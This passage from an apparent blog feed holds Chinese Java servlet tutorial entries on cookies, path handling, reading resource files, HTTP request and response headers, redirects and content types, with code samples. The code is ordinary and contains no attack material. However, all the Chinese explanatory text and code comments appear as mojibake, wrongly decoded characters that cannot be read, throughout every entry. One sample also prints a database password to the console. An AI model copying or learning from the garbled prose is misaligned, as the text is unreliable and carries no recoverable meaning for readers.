Cookie(‚Äúname‚Äù,‚Äùvalue‚Äù);<br>2ÔºâÊúçÂä°Âô®ÂèëÈÄÅcookie‰ø°ÊÅØÂà∞ÊµèËßàÂô®<br>response.add(cookie);<br>‰∏æ‰æãÔºöset-cookieÔºöname=ericÔºàÈöêËóèÂèëÈÄÅ‰∫Ü‰∏Ä‰∏™set-cookieÂêçÁß∞ÁöÑÂìçÂ∫îÂ§¥Ôºâ<br>3)ÊµèËßàÂô®ÂæóÂà∞ÊúçÂä°Âô®ÂèëÈÄÅÁöÑcookieÔºåÁÑ∂Âêé‰øùÂ≠òÂú®ÊµèËßàÂô®Á´Ø<br>4ÔºâÊµèËßàÂô®Âú®‰∏ãÊ¨°ËÆøÈóÆÊúçÂä°Âô®Êó∂Ôºå‰ºöÂ∏¶ÁùÄcookie‰ø°ÊÅØ<br>‰∏æ‰æãÔºöcookieÔºöname=ericÔºàÈöêËóèÂ∏¶ÁùÄ‰∏Ä‰∏™Âè´cookieÂêçÁß∞ÁöÑËØ∑Ê±ÇÂ§¥Ôºâ<br>5ÔºâÊúçÂä°Âô®Êé•Êî∂Âà∞Êù•Ëá™ÊµèËßàÂô®Â∏¶Êù•ÁöÑcookie‰ø°ÊÅØ<br>request.getCookies();</p><p>3.4CookieÁöÑÁªÜËäÇ<br>1Ôºâvoid setPath(java.lang.String<br>uri):ËÆæÁΩÆcookieÁöÑÊúâÊïàËÆøÈóÆË∑ØÂæÑ„ÄÇÊúâÊïàË∑ØÂæÑÊåáÁöÑÊòØcookieÁöÑÊúâÊïàË∑ØÂæÑ‰øùÂ≠òÂú®Âì™ÈáåÔºåÈÇ£‰πàÊµèËßàÂô®Âú®ÊúâÊïàË∑ØÂæÑ‰∏ãËÆøÈóÆÂ∞±‰ºöÂ∏¶ÁùÄcookie‰ø°ÊÅØÔºåÂê¶Âàô‰∏çÂ∏¶cookie‰ø°ÊÅØ<br>2Ôºâvoid setMaxAge(int expiry):ËÆæÁΩÆcookieÁöÑÊúâÊïàÊó∂Èó¥<br>Ê≠£Êï¥Êï∞ÔºöË°®Á§∫cookieÊï∞ÊçÆ‰øùÂ≠òÂú®ÊµèËßàÂô®ÁöÑÁºìÂ≠òÁõÆÂΩï‰∏≠ÔºàÁ°¨ÁõòÔºâÔºåÊï∞ÂÄºË°®Á§∫‰øùÂ≠òÊó∂Èó¥ÔºàÁßí‰∏∫Âçï‰ΩçÔºâ<br>Ë¥üÊï¥Êï∞ÔºöÂÖ≥Èó≠ÊµèËßàÂô®cookie‰∏¢Â§±<br>Èõ∂ÔºöË°®Á§∫Âà†Èô§ÂêåÂêçÁöÑcookieÊï∞ÊçÆ<br>3ÔºâcookieÊï∞ÊçÆÁ±ªÂûãÂè™ËÉΩ‰øùÂ≠òÈùû‰∏≠ÊñáÂ≠óÁ¨¶‰∏≤Á±ªÂûãÁöÑ„ÄÇÂèØ‰ª•‰øùÂ≠òÂ§ö‰∏™cookieÔºå‰ΩÜÊòØÊµèËßàÂô®‰∏ÄËà¨Âè™ÂÖÅËÆ∏Â≠òÊîæ300‰∏™cookieÔºåÊØè‰∏™Á´ôÁÇπÊúÄÂ§öÂ≠òÊîæ20‰∏™cookieÔºåÊØè‰∏™cookieÁöÑÂ§ßÂ∞èÈôêÂà∂4kb„ÄÇËÄå‰∏î‰∏çÂèØ‰ª•Âá∫Áé∞asciiÔºà44,32ÔºâÁöÑÂ≠óÁ¨¶Ôºå‰πüÂ∞±ÊòØÁ©∫Ê†º<br>ÂíåÈÄóÂè∑ ,</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>webÂ∫îÁî®‰∏≠Ë∑ØÂæÑÈóÆÈ¢ò‰ª•ÂèäËØªÂèñwebÂ∫îÁî®‰∏ãËµÑÊ∫êÊñá‰ª∂</title>
      <link href="/2017/12/08/web%E5%BA%94%E7%94%A8%E4%B8%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E8%AF%BB%E5%8F%96web%E5%BA%94%E7%94%A8%E4%B8%8B%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6/"/>
      <url>/2017/12/08/web%E5%BA%94%E7%94%A8%E4%B8%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E8%AF%BB%E5%8F%96web%E5%BA%94%E7%94%A8%E4%B8%8B%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>*<em><em>webÂ∫îÁî®‰∏≠Ë∑ØÂæÑÈóÆÈ¢ò</em> *</em></p><pre><code>/**ÁõÆÊ†áËµÑÊ∫êÔºötarget.htmlÊÄùËÄÉÔºöÁõÆÊ†áËµÑÊ∫êÊòØÁªôË∞ÅÁî®ÁöÑ                ÁªôÊúçÂä°Âô®‰ΩøÁî®ÁöÑÔºö/Ë°®Á§∫Âú®ÂΩìÂâçwebÂ∫îÁî®ÁöÑÊ†πÁõÆÂΩï                ÁªôÊµèËßàÂô®‰ΩøÁî®ÁöÑÔºö/Ë°®Á§∫Âú®webappsÁöÑÊ†πÁõÆÂΩï‰∏ã*/</code></pre><p>‰ª£Á†ÅÁâá</p><pre><code>public class PathDemo extends HttpServlet {    public void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException {        response.setContentType(&quot;text/html;charset=utf-8&quot;);        //ÁõÆÊ†áËµÑÊ∫êÔºö target.html        /**         * ÊÄùËÄÉÔºö ÁõÆÊ†áËµÑÊ∫êÊòØÁªôË∞Å‰ΩøÁî®ÁöÑ„ÄÇ         *      ÁªôÊúçÂä°Âô®‰ΩøÁî®ÁöÑÔºö   / Ë°®Á§∫Âú®ÂΩìÂâçwebÂ∫îÁî®ÁöÑÊ†πÁõÆÂΩïÔºàwebRoot‰∏ãÔºâ         *      ÁªôÊµèËßàÂô®‰ΩøÁî®ÁöÑÔºö /  Ë°®Á§∫Âú®webappsÁöÑÊ†πÁõÆÂΩï‰∏ã         */        /**         * 1.ËΩ¨Âèë         */        //request.getRequestDispatcher(&quot;/target.html&quot;).forward(request, response);        /**         * 2.ËØ∑Ê±ÇÈáçÂÆöÂêë         */        //response.sendRedirect(&quot;/day11/target.html&quot;);        /**         * 3.htmlÈ°µÈù¢ÁöÑË∂ÖËøûÊé•href         */        response.getWriter().write(&quot;&lt;html&gt;&lt;body&gt;&lt;a href=&apos;/day11/target.html&apos;&gt;Ë∂ÖÈìæÊé•&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;);        /**         * 4.htmlÈ°µÈù¢‰∏≠ÁöÑformÊèê‰∫§Âú∞ÂùÄ         */        response.getWriter().write(&quot;&lt;html&gt;&lt;body&gt;&lt;form action=&apos;/day11/target.html&apos;&gt;&lt;input type=&apos;submit&apos;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;);    }}</code></pre><p>ËΩ¨ÂèëÂíåËØ∑Ê±ÇÈáçÂÆöÂêëÁöÑÂå∫Âà´</p><pre><code>/**1ÔºâËΩ¨Âèë    a)Âú∞ÂùÄÊ†è‰∏ç‰ºöÊîπÂèò    b)ËΩ¨ÂèëÂè™ËÉΩËΩ¨Âà∞ÂΩìÂâçwebÂ∫îÁî®ÂÜÖÁöÑËµÑÊ∫ê    c)ÂèØ‰ª•Âú®ËΩ¨ÂèëËøáÁ®ã‰∏≠ÔºåÂèØ‰ª•ÊääÊï∞ÊçÆ‰øùÂ≠òÂà∞request2)ËØ∑Ê±ÇÈáçÂÆöÂêë    a)Âú∞ÂùÄÊ†è‰ºöÊîπÂèòÔºåÂèòÊàêÈáçÂÆöÂêëÁöÑÂú∞ÂùÄ    b)ÈáçÂÆöÂêëÂèØ‰ª•Ë∑≥ËΩ¨Âà∞ÂΩìÂâçwebÂ∫îÁî®Ôºå‰πüÂèØ‰ª•ÊòØÂÖ∂‰ªñwebÂ∫îÁî®Ôºå‰πüÂèØ‰ª•ÊòØÂ§ñÈÉ®ÂüüÂêçÁΩëÁ´ô    cÔºâ‰∏çËÉΩÂú®ÈáçÂÆöÂêëÁöÑËøáÁ®ãÔºåÊääÊï∞ÊçÆ‰øùÂ≠òÂà∞request‰∏≠//ÁªìËÆ∫ÔºöÂ¶ÇÊûúË¶Å‰ΩøÁî®requestÂüüÂØπË±°ËøõË°åÊï∞ÊçÆÂÖ±‰∫´ÔºåÂè™ËÉΩÁî®ËΩ¨ÂèëÊäÄÊúØ*/</code></pre><p><strong>ËØªÂèñwebÂ∫îÁî®‰∏ãÁöÑËµÑÊ∫êÊñá‰ª∂</strong></p><pre><code>/**ËØªÂèñÊñá‰ª∂„ÄÇÂú®webÈ°πÁõÆ‰∏ã‰∏çË¶ÅËøôÊ†∑ËØªÂèñ„ÄÇÂõ†‰∏∫.Ë°®Á§∫Âú®tomcat/binÁõÆÂΩï‰∏ãFile file = new File(&quot;./src/db.properties&quot;);FileInputStream in = new FileInputStream(file);*///‰ΩøÁî®webÂ∫îÁî®‰∏ãÂä†ËΩΩËµÑÊ∫êÊñá‰ª∂ÁöÑÊñπÊ≥ï/**1.getRealPathËØªÂèñÔºåËøîÂõûËµÑÊ∫êÊñá‰ª∂ÁöÑÁªùÂØπË∑ØÂæÑ*//**String path = this.getServletContext().getRealPath(&quot;/WEB-INF/classes/db.properties&quot;);File file = new File(path);FileInputStream in = new FileInputStream(file);*//**2.getResourceAsStream()ÂæóÂà∞ËµÑÊ∫êÊñá‰ª∂ÔºåËøîÂõûÁöÑÊòØËæìÂÖ•ÊµÅ*/InputStream in = this.getServletContext().getResourceAsStream(&quot;/WEB-INF/classes/db.properties&quot;);Properties prop = new Properties();//ËØªÂèñËµÑÊ∫êÊñá‰ª∂prop.load(in);String user = prop.getProperty(&quot;user&quot;);String password = prop.getProperty(&quot;password&quot;);System.out.println(&quot;user:&quot;+user+&quot;password:&quot;+password);</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>httpÂçèËÆÆ-response</title>
      <link href="/2017/11/27/http%E5%8D%8F%E8%AE%AE-response/"/>
      <url>/2017/11/27/http%E5%8D%8F%E8%AE%AE-response/</url>
      
        <content type="html"><![CDATA[<pre><code>HTTP/1.1 200 OK                --ÂìçÂ∫îË°åServer: Apache-Coyote/1.1         --ÂìçÂ∫îÂ§¥Ôºàkey-vauleÔºâContent-Length: 24 Date: Fri, 30 Jan 2015 01:54:57 GMT                                   --‰∏Ä‰∏™Á©∫Ë°åthis is hello servlet!!!                  --ÂÆû‰ΩìÂÜÖÂÆπÁä∂ÊÄÅÁ†Å    200 ËØ∑Ê±ÇÂ∑≤ÊàêÂäüÔºåËØ∑Ê±ÇÊâÄÂ∏åÊúõÁöÑÂìçÂ∫îÂ§¥ÊàñÊï∞ÊçÆ‰ΩìÂ∞ÜÈöèÊ≠§ÂìçÂ∫îËøîÂõû„ÄÇ    302 ËØ∑Ê±ÇÈáçÂÆöÂêë    404 ÂÆ¢Êà∑ËÆøÈóÆÁöÑËµÑÊ∫êÊâæ‰∏çÂà∞    500 Ë°®Á§∫ÊúçÂä°Âô®ÁöÑËµÑÊ∫êÂèëÈÄÅÈîôËØØÔºàÊúçÂä°Âô®ÂÜÖÈÉ®ÈîôËØØÔºâ</code></pre><p><strong>Â∏∏ËßÅÁöÑÂìçÂ∫îÂ§¥</strong></p><pre><code>Location: http://www.it315.org/index.jsp   -Ë°®Á§∫ÈáçÂÆöÂêëÁöÑÂú∞ÂùÄÔºåËØ•Â§¥Âíå302ÁöÑÁä∂ÊÄÅÁ†Å‰∏ÄËµ∑‰ΩøÁî®„ÄÇServer:apache tomcat                 ---Ë°®Á§∫ÊúçÂä°Âô®ÁöÑÁ±ªÂûãContent-Encoding: gzip                 -- Ë°®Á§∫ÊúçÂä°Âô®ÂèëÈÄÅÁªôÊµèËßàÂô®ÁöÑÊï∞ÊçÆÂéãÁº©Á±ªÂûãContent-Length: 80                    --Ë°®Á§∫ÊúçÂä°Âô®ÂèëÈÄÅÁªôÊµèËßàÂô®ÁöÑÊï∞ÊçÆÈïøÂ∫¶Content-Language: zh-cn               --Ë°®Á§∫ÊúçÂä°Âô®ÊîØÊåÅÁöÑËØ≠Ë®ÄContent-Type: text/html; charset=GB2312   --Ë°®Á§∫ÊúçÂä°Âô®ÂèëÈÄÅÁªôÊµèËßàÂô®ÁöÑÊï∞ÊçÆÁ±ªÂûãÂèäÂÜÖÂÆπÁºñÁ†ÅLast-Modified: Tue, 11 Jul 2000 18:23:51 GMT  --Ë°®Á§∫ÊúçÂä°Âô®ËµÑÊ∫êÁöÑÊúÄÂêé‰øÆÊîπÊó∂Èó¥Refresh: 1;url=http://www.it315.org     --Ë°®Á§∫ÂÆöÊó∂Âà∑Êñ∞Content-Disposition: attachment; filename=aaa.zip --Ë°®Á§∫ÂëäËØâÊµèËßàÂô®‰ª•‰∏ãËΩΩÊñπÂºèÊâìÂºÄËµÑÊ∫êÔºà‰∏ãËΩΩÊñá‰ª∂Êó∂Áî®Âà∞ÔºâTransfer-Encoding: chunkedSet-Cookie:SS=Q0=5Lb_nQ; path=/search   --Ë°®Á§∫ÊúçÂä°Âô®ÂèëÈÄÅÁªôÊµèËßàÂô®ÁöÑcookie‰ø°ÊÅØÔºà‰ºöËØùÁÆ°ÁêÜÁî®Âà∞ÔºâExpires: -1                           --Ë°®Á§∫ÈÄöÁü•ÊµèËßàÂô®‰∏çËøõË°åÁºìÂ≠òCache-Control: no-cachePragma: no-cacheConnection: close/Keep-Alive           --Ë°®Á§∫ÊúçÂä°Âô®ÂíåÊµèËßàÂô®ÁöÑËøûÊé•Áä∂ÊÄÅ„ÄÇcloseÔºöÂÖ≥Èó≠ËøûÊé• keep-alive:‰øùÂ≠òËøûÊé•</code></pre><p><strong>HttpServletResponseÂØπË±°</strong></p><pre><code>ÂìçÂ∫îË°åÔºö    response.setStatus() ËÆæÁΩÆÁä∂ÊÄÅÁ†ÅÂìçÂ∫îÂ§¥Ôºö    response.setHeader(&quot;name&quot;,&quot;value&quot;);ÂÆû‰ΩìÂÜÖÂÆπÔºöÔºàÂÆ¢Êà∑ÂèØ‰ª•ÁúãËßÅÁöÑÔºâ    response.getWriter().writer();//ÂèëÈÄÅÂ≠óÁ¨¶ÂÆû‰ΩìÂÜÖÂÆπ protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        /**         * 3ÔºâÈÄöËøáresponseÂØπË±°ÊîπÂèòÂìçÂ∫î‰ø°ÊÅØ         * */        /**         * 3.1ÂìçÂ∫îË°å         *         * */        //‰øÆÊîπÁä∂ÊÄÅÁ†Å        //response.setStatus(404);//‰øÆÊîπÁä∂ÊÄÅÁ†Å        //response.sendError(404);//ÂèëÈÄÅÁä∂ÊÄÅÁ†ÅËøòÊúâÈîôËØØÈ°µÈù¢        /**         * 3.2ÂìçÂ∫îÂ§¥         * */        response.setHeader(&quot;server&quot;,&quot;JBoss&quot;);        /**         * 3.3ÂÆû‰ΩìÂÜÖÂÆπÔºàÊµèËßàÂô®Áõ¥Êé•ÂèØ‰ª•ÁúãÂà∞ÁöÑÂÜÖÂÆπÔºâ         * */        response.getWriter().write(&quot;01.hello world&quot;);    }</code></pre><p><strong>ËØ∑Ê±ÇÈáçÂÆöÂêë</strong></p><pre><code>@WebServlet(name = &quot;ResponseDemo2&quot;,urlPatterns = &quot;/ResponseDemo2&quot;)public class ResponseDemo2 extends HttpServlet {    /**     * ÈúÄÊ±ÇÔºöË∑≥ËΩ¨Âà∞adv„ÄÇhtml     * ‰ΩøÁî®ËØ∑Ê±ÇÈáçÂÆöÂêëÔºöÂèëÈÄÅ‰∏Ä‰∏™302Áä∂ÊÄÅÁ†Å+locationÁöÑÂìçÂ∫îÂ§¥     *     * */    /**     * ËØ∑Ê±ÇÈáçÂÆöÂêëÊµèËßàÂô®‰∏ÄÂÖ±ÊÉ≥ÊúçÂä°Âô®ÂèëÈÄÅ‰∏§Ê¨°ËØ∑Ê±ÇÔºåÁ¨¨‰∏ÄÊ¨°ÊòØResponseDemo1ÔºåÁ¨¨‰∫åÊ¨°ÊòØadv„ÄÇhtml     * ÊúçÂä°Âô®‰πüÊòØËøîÂõû‰∏§Ê¨°ÔºåÁ¨¨‰∏ÄÊ¨°ÊòØstatus302Ôºålocation„ÄÇadv.html,Á¨¨‰∫åÊ¨°ÊòØadv„ÄÇhtml     *  */    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {//        response.setStatus(302);//        response.setHeader(&quot;location&quot;,&quot;/some/adv.html&quot;);        //ËØ∑Ê±ÇÈáçÂÆöÂêëÁÆÄÂåñÂÜôÊ≥ï        response.sendRedirect(&quot;/some/adv.html&quot;);    }}</code></pre><p><strong>ÂÆöÊó∂Âà∑Êñ∞ÂíåÈöînÁßíË∑≥ËΩ¨Âà∞Âè¶Â§ñÈ°µÈù¢</strong></p><pre><code>//ÂÆöÊó∂Âà∑Êñ∞response.setHeader(&quot;refresh&quot;,&quot;1&quot;);/**ÈöînÁßíË∑≥ËΩ¨Âà∞ÂÖ∂‰ªñÈ°µÈù¢*/response.setHeader(&quot;refresh&quot;,&quot;3;url=/some/adv.html&quot;)//Èöî‰∏âÁßíÔºåË∑≥ËΩ¨Âà∞adv.html</code></pre><p><strong>content-Type‰ΩúÁî®</strong></p><pre><code>@WebServlet(name = &quot;ResponseDemo4&quot;,urlPatterns = &quot;/ResponseDemo4&quot;)public class ResponseDemo4 extends HttpServlet {    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        /**         *1.ÊúçÂä°Âô®ÂèëÈÄÅÁªôÊµèËßàÂô®ÁöÑÊï∞ÊçÆÁ±ªÂûã         * */        response.setContentType(&quot;text/html;charset=utf-8&quot;);       // response.setContentType(&quot;text/html&quot;);        //ËÆæÁΩÆÂìçÂ∫îÂÆû‰ΩìÂÜÖÂÆπÁºñÁ†Å       // response.setCharacterEncoding(&quot;utf-8&quot;);        //response.setHeader(&quot;content-type&quot;,&quot;text/html&quot;);//Âíå‰∏äÈù¢ÁöÑ‰ª£Á†ÅÁ≠â‰ª∑        //response.setContentType(&quot;text/xml&quot;);        response.getWriter().write(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;‰∏≠ÂõΩ&lt;/body&gt;&lt;/html&gt;&quot;);        //File file = new File(&quot;e:gakki.jpg&quot;);        /**         * ËÆæÁΩÆ‰ª•‰∏ãËΩΩÊñπÂºèÊâìÂºÄÊñá‰ª∂         *         * */        //response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename&quot; + file.getName());        /**         * ‰∏ãËΩΩÂõæÁâá         * */        /**         * ÂèëÈÄÅÂõæÁâá         * *///        response.setContentType(&quot;image/jpg&quot;);//        FileInputStream in  = new FileInputStream(file);//        byte[] buf = new byte[1024];//        int len = 0;//        //ÊääÂõæÁâáÂÜôÂà∞ÊµèËßàÂô®//        while((len = in.read(buf))!=-1){//            response.getOutputStream().write(buf,0,len);//        }//    }    }}</code></pre><p><strong>ÂÆåÁæéËß£ÂÜ≥È°πÁõÆÁºñÁ†ÅÈóÆÈ¢ò</strong></p><pre><code>/**Âú®ÊØè‰∏™servletÂºÄÂ§¥ÂÜôÔºö*/request.setCharacterEncoding(&quot;utf-8&quot;);response.setContentType(&quot;text/html;charset=utf-8&quot;);</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>httpÂçèËÆÆ-request</title>
      <link href="/2017/11/21/http%E5%8D%8F%E8%AE%AE-request/"/>
      <url>/2017/11/21/http%E5%8D%8F%E8%AE%AE-request/</url>
      
        <content type="html"><![CDATA[<p>httpÂçèËÆÆÂÜÖÂÆπ</p><pre><code>ËØ∑Ê±ÇÔºàÊµèËßàÂô®-„ÄãÊúçÂä°Âô®Ôºâ RequestGET /day09/hello HTTP/1.1--ËØ∑Ê±ÇË°åHost: localhost:8080---ËØ∑Ê±ÇÂ§¥ÔºàÂ§ö‰∏™key-valueÂØπË±°ÔºâUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,en-us;q=0.8,zh;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-alive                            ---‰∏Ä‰∏™Á©∫Ë°åname=husky&amp;password=adios ----(ÂèØÈÄâ)ÂÆû‰ΩìÂÜÖÂÆπÔºàÂè™ÊúâpostÊèê‰∫§ÁöÑÂèÇÊï∞‰ºöÊîæÂà∞ÂÆû‰ΩìÂÜÖÂÆπ‰∏≠ÔºâÔºâ                            ÂìçÂ∫îÔºàÊúçÂä°Âô®-„ÄãÊµèËßàÂô®ÔºâResponseHTTP/1.1 200 OKServer: Apache-Coyote/1.1Content-Length: 24Date: Fri, 30 Jan 2015 01:54:57 GMTthis is hello servlet!!!</code></pre><p>httpÂçèËÆÆÁâàÊú¨</p><pre><code>http1.0: ÂΩìÂâçÊµèËßàÂô®ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Âô®Âª∫Á´ãËøûÊé•ÂêéÔºåÂè™ËÉΩÂèëÈÄÅ‰∏ÄÊ¨°ËØ∑Ê±ÇÔºå‰∏ÄÊ¨°ËØ∑Ê±Ç‰πãÂêéËøûÊé•ÂÖ≥Èó≠http1.1:ÂΩìÂâçÊµèËßàÂô®ÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®Âª∫Á´ãËøûÊé•‰πãÂêéÔºåÂèØ‰ª•Âú®‰∏ÄÊ¨°ËøûÊé•‰∏≠ÂèëÈÄÅÂ§öÊ¨°ËØ∑Ê±Ç„ÄÇÔºàÂü∫Êú¨‰∏äÈÉΩ‰ΩøÁî®1.1ÁâàÊú¨Ôºâ</code></pre><p>ËØ∑Ê±ÇÊñπÂºè</p><pre><code>Â∏∏ËßÅËØ∑Ê±ÇÊñπÂºèÔºöGETÂíåPOST1ÔºâGETÊñπÂºèÊèê‰∫§     a)Âú∞ÂùÄÊ†èÔºàurlÔºâ‰ºöË∑ü‰∏äÂèÇÊï∞Êï∞ÊçÆ„ÄÇ‰ª•ÔºüÂºÄÂ§¥ÔºåÂ§ö‰∏™ÂèÇÊï∞‰ª•&amp;ÂàÜÂâ≤     GET /day09/testMethod.html?name=eric&amp;password=123456 HTTP/1.1     b)GETÊèê‰∫§ÂèÇÊï∞Êï∞ÊçÆÊúâÈôêÂà∂Ôºå‰∏çË∂ÖËøá1kb     c)GETÊñπÂºè‰∏çÈÄÇÂêàÊèê‰∫§ÊïèÊÑüÂØÜÁ†Å„ÄÇ     d)Ê≥®ÊÑèÔºöÊµèËßàÂô®Áõ¥Êé•ËÆøÈóÆÁöÑËØ∑Ê±ÇÔºåÈªòËÆ§Êèê‰∫§ÊñπÂºèÊòØGETÊñπÂºè„ÄÇ 2ÔºâPOSTÊñπÂºèÊèê‰∫§     a)ÂèÇÊï∞‰∏ç‰ºöË∑üÂú®URIÂêéÈù¢„ÄÇÂèÇÊï∞ËÄåÊòØË∑üÂú®ËØ∑Ê±ÇÁöÑÂÆû‰ΩìÂÜÖÂÆπ‰∏≠„ÄÇÊ≤°ÊúâÔºüÂºÄÂ§¥ÔºåËÄåÊòØ‰ª•&amp;ËøûÊé•     name=eric&amp;password=123456     b)postÊèê‰∫§ÁöÑÂèÇÊï∞Êï∞ÊçÆÊ≤°ÊúâÈôêÂà∂„ÄÇ     c)postÊñπÂºèÊèê‰∫§Èì≠ÊÑüÊï∞ÊçÆ</code></pre><p>ËØ∑Ê±ÇÂ§¥</p><pre><code>Accept: text/html,image/*      -- ÊµèËßàÂô®Êé•ÂèóÁöÑÊï∞ÊçÆÁ±ªÂûãAccept-Charset: ISO-8859-1     -- ÊµèËßàÂô®Êé•ÂèóÁöÑÁºñÁ†ÅÊ†ºÂºèAccept-Encoding: gzip,compress  --ÊµèËßàÂô®Êé•ÂèóÁöÑÊï∞ÊçÆÂéãÁº©Ê†ºÂºèAccept-Language: en-us,zh-       --ÊµèËßàÂô®Êé•ÂèóÁöÑËØ≠Ë®ÄHost: www.it315.org:80          --ÔºàÂøÖÈ°ªÁöÑÔºâÂΩìÂâçËØ∑Ê±ÇËÆøÈóÆÁöÑÁõÆÊ†áÂú∞ÂùÄÔºà‰∏ªÊú∫:Á´ØÂè£ÔºâIf-Modified-Since: Tue, 11 Jul 2000 18:23:51 GMT  --ÊµèËßàÂô®ÊúÄÂêéÁöÑÁºìÂ≠òÊó∂Èó¥Referer: http://www.it315.org/index.jsp      -- ÂΩìÂâçËØ∑Ê±ÇÊù•Ëá™‰∫éÂì™ÈáåUser-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)  --ÊµèËßàÂô®Á±ªÂûãCookie:name=eric                     -- ÊµèËßàÂô®‰øùÂ≠òÁöÑcookie‰ø°ÊÅØConnection: close/Keep-Alive            -- ÊµèËßàÂô®Ë∑üÊúçÂä°Âô®ËøûÊé•Áä∂ÊÄÅ„ÄÇclose: ËøûÊé•ÂÖ≥Èó≠  keep-aliveÔºö‰øùÂ≠òËøûÊé•„ÄÇDate: Tue, 11 Jul 2000 18:23:51 GMT      -- ËØ∑Ê±ÇÂèëÂá∫ÁöÑÊó∂Èó¥</code></pre><p>ÈÄöËøáservletËé∑ÂæóÊµèËßàÂô®ÂèëËøáÊù•ÁöÑËØ∑Ê±ÇÊï∞ÊçÆ<br>RequestDemo2.java</p><pre><code>package com.husky.javaweb;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.InputStream;import java.util.Enumeration;@WebServlet(name = &quot;RequestDemo2&quot;,urlPatterns = &quot;/RequestDemo2&quot;)public class RequestDemo2 extends HttpServlet {    //‰∏∫‰∫ÜÊé•Êî∂POSTÊñπÂºèÊèê‰∫§ÁöÑËØ∑Ê±Ç    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        t3(request);    }    /**     * 1)tomcatÊúçÂä°Âô®Êé•ÂèóÂà∞ÊµèËßàÂô®ÂèëÈÄÅÁöÑËØ∑Ê±ÇÊï∞ÊçÆÔºåÁÑ∂ÂêéÂ∞ÅË£ÖÂà∞HttpServletRequestÂØπË±°‰∏≠     * 2ÔºâtomcatÊúçÂä°Âô®Ë∞ÉÁî®doGetÊñπÊ≥ïÔºåÁÑ∂ÂêéÊäärequestÂØπË±°‰º†ÂÖ•Âà∞servlet‰∏≠„ÄÇ     *     * */    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        /**         * 3Ôºâ‰ªérequestÂØπË±°ÂèñÂá∫ËØ∑Ê±ÇÊï∞ÊçÆ         * */        /**         * 3.1ËØ∑Ê±ÇË°å Ê†ºÂºèÔºöÔºàGET /hello http1.1Ôºâ         * */        //t1(request);        /**         * 3.2ËØ∑Ê±ÇÂ§¥         * */        //t2(request);        /**         * 3.3ËØ∑Ê±ÇÁöÑÂÆû‰ΩìÂÜÖÂÆπ         * Âú®doPost‰∏≠ÂÆûÁé∞         * */    }    private void t3(HttpServletRequest request) throws IOException {        InputStream in = request.getInputStream();        byte[] buf = new byte[1024];        int len = 0;        while((len = in.read(buf))!= -1){            String str = new String(buf,0,len);            System.out.println(str);        }    }    private void t2(HttpServletRequest request) {        String host = request.getHeader(&quot;Host&quot;);        System.out.println(host);        //ÂèòÈáè        Enumeration&lt;String&gt; enums = request.getHeaderNames();        while(enums.hasMoreElements()){            String headerName = enums.nextElement();            String headerValue = request.getHeader(headerName);            System.out.println(headerName + &quot; : &quot;+headerValue);        }    }    private void t1(HttpServletRequest request) {        System.out.println(&quot;ËØ∑Ê±ÇÊñπÂºè: &quot;+request.getMethod());        System.out.println(&quot;URI: &quot;+request.getRequestURI());        System.out.println(&quot;URL: &quot;+request.getRequestURL());        System.out.println(&quot;httpÂçèËÆÆÁâàÊú¨Ôºö&quot;+request.getProtocol());    }}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> httpÂçèËÆÆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÈÖçÁΩÆÁ¨¨‰∏Ä‰∏™servlet</title>
      <link href="/2017/11/20/%E9%85%8D%E7%BD%AE%E7%AC%AC%E4%B8%80%E4%B8%AAservlet/"/>
      <url>/2017/11/20/%E9%85%8D%E7%BD%AE%E7%AC%AC%E4%B8%80%E4%B8%AAservlet/</url>
      
        <content type="html"><![CDATA[<pre><code>//È¶ñÂÖàÂÜô‰∏Ä‰∏™HelloServlet.java,ÈÄöËøáÁºñËØëÂêéÔºåÂæóÂà∞‰∏Ä‰∏™HelloServlet.class//‰∏ãÈù¢ÊòØHelloServlet.javaÊ∫ê‰ª£Á†Åpackage com.husky.sever;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.util.Date;public class HelloServlet extends HttpServlet {    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        //Ëß£ÂÜ≥‰∏≠Êñá‰π±Á†Å        response.setContentType(&quot;text/html;charset=utf-8&quot;);        //ÂêëÊµèËßàÂô®ËæìÂá∫ÂÜÖÂÆπ        response.getWriter().write(&quot;ËøôÊòØ‰∏Ä‰∏™servletÁ®ãÂ∫èÔºåÂΩìÂâçÊó∂Èó¥‰∏∫Ôºö&quot;+ new Date());    